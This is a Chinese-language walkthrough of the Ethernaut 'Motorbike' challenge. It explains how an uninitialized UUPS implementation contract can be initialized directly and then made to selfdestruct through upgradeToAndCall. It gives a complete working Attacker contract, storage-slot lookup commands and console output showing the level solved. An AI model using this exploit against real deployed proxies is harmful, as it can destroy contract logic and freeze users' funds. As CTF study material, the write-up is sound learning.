# 26 Motorbike

## 思路

目标: 利用`selfdestruct ` 让摩托车的Engine自毁

```solidity
// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "openzeppelin-contracts-06/utils/Address.sol";
import "openzeppelin-contracts-06/proxy/Initializable.sol";

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    
    struct AddressSlot {
        address value;
    }
    
    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(Address.isContract(_logic), "ERC1967: new implementation is not a contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success,) = _logic.delegatecall(
            abi.encodeWithSignature("initialize()")
        );
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`. 
    // Will run if no other function in the contract matches the call data
    fallback () external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r_slot := slot
        }
    }
}

contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) internal {
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success,) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }
    
    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(Address.isContract(newImplementation), "ERC1967: new implementation is not a contract");
        
        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
```



思路:

`Engine`合约并没有自毁相关的函数,  但对于一个使用的`delegatecall`的合约, 可以让其`delegatecall`到另外一个合约的自毁函数 而实现自毁, 参考这里 https://github.com/yinhui1984/SolidityReference/blob/main/docs/selfdestruct.md

参考题目给出的代码, 要使用`Engine`中的`delegatecall`, 则需要满足` require(msg.sender == upgrader, "Can't upgrade");` , 可以通过调用 `initialize()`来修改`upgrader`的值.

题目提供的代码使用的是UUPS [(EIP1182)](https://eips.ethereum.org/EIPS/eip-1822): 通用的可升级代理标准, 如果通过`Proxy`去调用`initialize()`函数, 其会报错: Initializable: contract is already initialized, 这是`initializer`函数修改器干的事情.

```solidity
// SPDX-License-Identifier: MIT

// solhint-disable-next-line compiler-version
pragma solidity >=0.4.24 <0.8.0;

import "../utils/Address.sol";


abstract contract Initializable {

    /**
     * @dev Indicates that the contract has been initialized.
     */
    bool private _initialized;

    /**
     * @dev Indicates that the contract is in the process of being initialized.
     */
    bool private _initializing;

    /**
     * @dev Modifier to protect an initializer function from being invoked twice.
     */
    modifier initializer() {
        require(_initializing || _isConstructor() || !_initialized, "Initializable: contract is already initialized");

        bool isTopLevelCall = !_initializing;
        if (isTopLevelCall) {
            _initializing = true;
            _initialized = true;
        }

        _;

        if (isTopLevelCall) {
            _initializing = false;
        }
    }

    /// @dev Returns true if and only if the function is running in the constructor
    function _isConstructor() private view returns (bool) {
        return !Address.isContract(address(this));
    }
}

```

也是 `require(_initializing || _isConstructor() || !_initialized, "Initializable: contract is already initialized");` 其中的` _initialized` 的值现在为`true`

重点来了: `_initialized`存储在哪里?

> 在代理模式中, 数据存储在Proxy中

![image](https://github.com/yinhui1984/imagehosting/blob/main/images/1677029887922671000.png?raw=true)

如果我们拿到Engine合约的地址, 对Engine合约直接进行调用` initializer()`函数, 而不是通过Proxy进行调用, 那么就可以通过`initializer`修改器的检查, 因为Engine合约本身的存储中`_initialized`为`0`, 也就是`false`

获取Engine合约的地址可以通过 web3.js的

```
> await web3.eth.getStorageAt(instance, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")
"0x00000000000000000000000067ee3f5247563be8e80736d920c8b6e6946f2064"
> await web3.utils.toChecksumAddress("0x67ee3f5247563be8e80736d920c8b6e6946f2064")
"0x67eE3F5247563Be8E80736d920c8B6E6946F2064"
```

或我写的小工具: https://github.com/yinhui1984/GetStorageAt , 第一个参数为题目的instance

```
~/Downloads ❯ getstorageat 0x92037989d2c7F6Bc09c15941F6c1d21Ee7Aff2B5  0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
Using provider: RPC connection http://localhost:8545
AS HEX:     0x00000000000000000000000067ee3f5247563be8e80736d920c8b6e6946f2064
AS INT:     593339142824096488061664646346959270155253653604
AS BYTES:   b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00g\xee?RGV;\xe8\xe8\x076\xd9 \xc8\xb6\xe6\x94o d'
AS STRING:  Not a string
AS ADDRESS: 0x67eE3F5247563Be8E80736d920c8B6E6946F2064
```



## 参考答案



```solidity
contract Attacker{

    function Destory() external {
        selfdestruct(payable(address(0x0)));
    }
    function attack(address _realEngine) external{
				//调用initialize(),使updater == msg.sender
        (bool success, ) = _realEngine.call(
            abi.encodeWithSignature("initialize()")
        );
        require(success);
				
				//使用engine的上下文调用destory 而让engine自毁
        bytes memory data = abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                address(this),
                abi.encodeWithSignature("Destory()"));

        (success, ) = _realEngine.call(data);

        require(success);
    }
}
```



![image](https://github.com/yinhui1984/imagehosting/blob/main/images/1677031179692289000.png?raw=true)

```
await web3.eth.getStorageAt(instance, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")
"0x00000000000000000000000067ee3f5247563be8e80736d920c8b6e6946f2064"
await web3.utils.toChecksumAddress("0x67ee3f5247563be8e80736d920c8b6e6946f2064")
"0x67eE3F5247563Be8E80736d920c8B6E6946F2064"
^^.js:45 ˁ(⦿ᴥ⦿)ˀ 正在提交关卡实例... <  < <<请稍等>> >  >
redux-logger.js:1  action SUBMIT_LEVEL_INSTANCE @ 09:57:49.300
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x25049cb43f8b6ccf3d2b74fcd5e35d8e9925749f57e701075df5432ef49869d3
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
redux-logger.js:1  action SUBMIT_LEVEL_INSTANCE @ 09:58:01.321
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x25049cb43f8b6ccf3d2b74fcd5e35d8e9925749f57e701075df5432ef49869d3
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:73 ( ͡° ͜ʖ ͡°) 牛逼！, 你通过了这关!!!
^^.js:56 
redux-logger.js:1  action SET_BLOCK_NUM @ 09:58:10.873

```

